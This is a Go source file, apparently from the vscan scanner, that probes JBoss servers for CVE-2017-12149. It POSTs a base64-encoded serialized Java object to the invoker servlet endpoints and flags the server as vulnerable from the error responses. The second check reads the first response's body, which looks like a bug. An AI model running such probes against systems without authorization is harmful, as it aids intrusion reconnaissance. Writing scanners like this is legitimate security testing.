package jboss

import (
	"encoding/base64"
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func CVE_2017_12149(url string) bool {
	header := make(map[string]string)
	header["Content-Type"] = "application/octet-stream"
	str := "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAAJZWxlbWVudCAxdAAJZWxlbWVudCAyeA=="
	payload, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		fmt.Println("decode error:", err)
	}
	url1 := url + "/invoker/readonly"
	url2 := url + "/invoker/JMXInvokerServlet/"
	url3 := url + "/invoker/EJBInvokerServlet/"
	if req, err := pkg.HttpRequset(url1, "POST", "", false, header); err == nil {
		if req.StatusCode == 500 && strings.Contains(req.Body, "ClassCastException") {
			if req2, err := pkg.HttpRequset(url2, "POST", string(payload), false, header); err == nil {
				if req2.StatusCode == 200 && strings.Contains(req.Body, "ClassCastException") {
					if req3, err := pkg.HttpRequset(url3, "POST", string(payload), false, header); err == nil {
						if req3.StatusCode == 200 {
							pkg.GoPocLog(fmt.Sprintf("Found vuln Jboss CVE_2017_12149|%s\n", url))
							return true
						}
					}
				}
			}
		}
	}
	return false
}
